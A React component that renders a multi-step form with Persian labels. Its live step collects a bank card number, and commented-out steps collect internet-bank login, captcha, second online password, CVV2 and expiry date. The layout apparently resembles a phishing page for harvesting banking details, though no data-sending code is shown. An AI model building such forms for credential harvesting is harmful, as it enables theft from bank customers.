import React from 'react';
import './StepRenderer.css';
import './StepForm.css';
import ProgressBar from './ProgressBar';
import RulesInput from './inputs/RulesInput';
import Form from './Form';
import TextInput from './inputs/TextInput';
import PassInput from './inputs/PassInput';
import NumberInput from './inputs/NumberInput';
import CaptchaInput from './inputs/CaptchaInput';
import CardInput from './inputs/CardInput';


class StepRenderer extends React.Component {
    render() {
        return (
            <div>
                <ProgressBar />
                        {/* <RulesInput /> */}
                <div className="steprenderer-content uk-width-1-1">
                    {/* <Form buttonText="ثبت اطلاعات">
                        <p style={{ textAlign: 'right'}}>ورود به اینترنت بانک</p>
                            <TextInput name="field1" placeholder="نام کاربری اینترنت بانک"/>
                            <TextInput name="field1" placeholder="رمز عبور اینترنت بانک"/>
                            <CaptchaInput />
                    </Form> */}
                    <Form buttonText="ثبت اطلاعات">
                        <p style={{ textAlign: 'right'}}>ثبت شماره کارت</p>
                            <CardInput />
                    </Form>
                    {/* <Form buttonText="مرحله بعد">
                        <p style={{ textAlign: 'right', marginTop: '10px', fontSize:'22px' }}>ثبت اطلاعات کارت</p>
                        <PassInput type="password" name="pass2" placeholder="رمز دوم اینترنتی" />
                        <PassInput type="password" name="cvv2" placeholder="CVV2" />
                        <p style={{textAlign:'right'}}>:تاریخ انقضای کارت</p>
                        <NumberInput type="number" placeholder="00" name="expire-date-month" />
                        <NumberInput type="number" placeholder="00" name="expire-date-day"/>
                    </Form> */}
                </div>
            </div>
        );
    }
}


export default StepRenderer;